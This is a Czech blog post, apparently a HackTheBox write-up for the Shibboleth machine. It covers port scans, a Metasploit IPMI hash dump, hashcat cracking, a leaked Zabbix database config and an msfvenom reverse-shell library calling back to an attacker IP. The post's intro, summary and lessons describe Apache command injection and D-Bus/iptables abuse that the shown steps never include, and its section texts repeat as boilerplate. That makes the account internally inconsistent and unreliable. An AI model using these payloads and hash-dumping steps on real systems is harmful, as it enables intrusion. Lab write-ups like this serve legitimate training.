---
layout: post
author: Tomáš Matějíček
title: "Shibboleth"
date: 2021-01-16
tags: linux rce exploit enumeration privesc hackthebox
---
## Úvod a kontext

U Shibboleth není hlavní hodnota v jednom efektním kroku, ale ve vazbě mezi Apache a D-Bus.

Článek dává smysl číst hlavně jako rozbor rozhodování: proč právě tyto stopy vedou k shell získaný exploitací zranitelné služby a proč po získání shellu dává smysl řešit zneužití D-Bus a práce s `iptables`.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU --min-rate 5000 --max-retries 1 -p- --open $IP
```
```
PORT    STATE SERVICE
623/udp open  asf-rmcp
```

## Analýza zjištění

### Lámání hesel nebo hashů

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
```bash
hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt
```
```
=> ilovepumkinpie1
```

## Získání přístupu

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
msfconsole
```
```
use scanner/ipmi/ipmi_dumphashes
set RHOST 10.10.11.124

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:__CENSORED__:__CENSORED__
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```text
__CENSORED__
```

Další klíčový artefakt byl konfigurační soubor Zabbix serveru:
```ini
DBHost=localhost
DBName=zabbix
DBUser=zabbix
DBPassword=__CENSORED__
```

### Spuštění exploitu (2)

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4001 -f elf-so -o CVE-2021-27928.so
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat /root/root.txt
```
```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako Apache, command injection a D-Bus.
- User část stála na ověřeném kroku typu shell získaný exploitací zranitelné služby, ne na odhadu bez technického potvrzení.
- Závěrečná eskalace pak stála na tom, co představuje zneužití D-Bus a práce s `iptables`, takže rozhodující byla práce s lokálním kontextem po footholdu.

## Co si odnést do praxe

- První obranná lekce míří na Apache, command injection a D-Bus. Příkazy skládající shell řetězce z neověřeného vstupu patří mezi nejrizikovější konstrukce; i zdánlivě omezený parametr se obvykle dá převést na RCE.
- Druhá lekce je o tom, jak rychle se ze zjištění stane shell získaný exploitací zranitelné služby. Jednorázové RCE je potřeba detekovat i na aplikační vrstvě; upload, template injection nebo command injection často vypadají v logu nenápadně, ale vedou ke stabilnímu shellu.
- Třetí lekce připomíná riziko, které v praxi představuje zneužití D-Bus a práce s `iptables`. Privilegované procesy komunikující přes D-Bus nebo podobné sběrnice musí důsledně ověřovat, kdo a s jakými parametry požadavek posílá; jinak se z pomocné automatiky stává privesc kanál.
